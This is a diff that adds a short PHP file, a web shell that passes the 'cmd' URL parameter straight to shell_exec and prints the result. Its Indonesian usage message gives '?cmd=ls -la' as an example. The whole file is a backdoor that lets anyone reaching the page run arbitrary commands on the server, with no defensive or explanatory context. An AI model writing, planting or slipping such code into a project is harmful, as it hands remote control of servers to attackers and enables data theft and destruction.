@@ -1,0 +1,11 @@
+<?php
+
+echo "<pre>";
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    echo shell_exec($cmd);
+} else {
+    echo "Gunakan parameter ?cmd= untuk menjalankan perintah. Contoh: ?cmd=ls -la";
+}
+echo "</pre>";
+?>
